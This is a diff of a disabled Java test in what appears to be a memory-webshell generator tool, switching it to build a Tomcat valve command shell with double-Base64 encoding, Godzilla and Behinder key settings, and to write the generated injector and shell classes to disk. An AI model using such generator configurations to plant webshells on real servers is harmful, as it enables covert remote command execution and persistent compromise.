@@ -21,18 +21,22 @@ class GeneratorMainTest {
     @Disabled
     void test() {
         ShellConfig shellConfig = ShellConfig.builder()
-                .server(Server.Apusic)
-                .shellTool(ShellTool.Behinder)
-                .shellType(ShellType.LISTENER)
+                .server(Server.Tomcat)
+                .shellTool(ShellTool.Command)
+                .shellType(ShellType.PROXY_VALVE)
                 .targetJreVersion(Opcodes.V1_8)
                 .debug(true)
+//                .shrink(true)
                 .build();
         GodzillaConfig godzillaConfig = GodzillaConfig.builder()
                 .pass("pass")
                 .key("key")
                 .headerName("User-Agent")
                 .headerValue("test123").build();
-        CommandConfig commandConfig = CommandConfig.builder().paramName("listener").build();
+        CommandConfig commandConfig = CommandConfig.builder()
+                .paramName("listener")
+                .encryptor(CommandConfig.Encryptor.DOUBLE_BASE64)
+                .build();
 
         BehinderConfig behinderConfig = BehinderConfig.builder()
                 .pass("test123")
@@ -45,8 +49,10 @@ class GeneratorMainTest {
 
         InjectorConfig injectorConfig = new InjectorConfig();
 
-        GenerateResult generateResult = MemShellGenerator.generate(shellConfig, injectorConfig, behinderConfig);
+        GenerateResult generateResult = MemShellGenerator.generate(shellConfig, injectorConfig, commandConfig);
         if (generateResult != null) {
+            System.out.println(generateResult.getShellBytes().length);
+//            System.out.println(((JarPacker) Packers.AgentJar.getInstance()).packBytes(generateResult).length);
             Files.write(Paths.get(generateResult.getInjectorClassName() + ".class"), generateResult.getInjectorBytes(), StandardOpenOption.CREATE_NEW);
             Files.write(Paths.get(generateResult.getShellClassName() + ".class"), generateResult.getShellBytes(), StandardOpenOption.CREATE_NEW);
 //            System.out.println(Base64.getEncoder().encodeToString(generateResult.getInjectorBytes()));
